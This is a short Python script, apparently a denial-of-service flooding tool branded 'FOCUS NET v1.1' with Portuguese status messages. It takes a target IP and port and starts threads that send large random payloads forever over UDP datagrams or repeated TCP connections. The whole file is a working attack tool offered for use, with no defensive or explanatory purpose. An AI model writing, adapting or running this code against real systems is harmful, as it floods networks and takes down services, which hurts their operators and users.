#env
#!/bin/sh
import argparse
import random
import socket
import threading
import os
import time
import sys
from colorama import Fore

#GITVE
os.system("clear")
sys.path.insert(1, './src')
from verup import gitve
gitve()

#ARGS
ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str)
ap.add_argument("-p", "--port", required=True, type=int)
ap.add_argument("-c", "--choice", type=str, default="Y")
ap.add_argument("-t", "--times", type=int, default=100)
ap.add_argument("-r", "--threads", type=int, default=5)
args = vars(ap.parse_args())



#BANNER
banner = """


███████╗ ██████╗  ██████╗██╗   ██╗███████╗  
██╔════╝██╔═══██╗██╔════╝██║   ██║██╔════╝
█████╗  ██║   ██║██║     ██║   ██║███████╗
██╔══╝  ██║   ██║██║     ██║   ██║╚════██║
██║     ╚██████╔╝╚██████╗╚██████╔╝███████║  NET v1.1
╚═╝      ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝  


                """
z = random.choice((Fore.LIGHTMAGENTA_EX + banner, Fore.LIGHTCYAN_EX + banner, Fore.LIGHTRED_EX + banner))
print(z)
print(Fore.RESET + "")
time.sleep(5)

#VARIAVEIS
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

#METHOD1
def run():
    u = random.choice((Fore.GREEN + " Enviado!", Fore.RED + " Enviado!", Fore.BLUE + " Enviado!"))
    data = random._urandom(999999)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i + u)
        except:
            print("[!] Error!!!")

#METHOD2
def run2():
    i = random.choice(("[*]","[!]","[#]"))   
    u = random.choice((Fore.GREEN + " Enviado!", Fore.RED + " Enviado!", Fore.BLUE + " Enviado!"))
    data = random._urandom(999999)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + u)
        except:
            s.close()
            print("[*] Error")



#CHOICE
for y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()


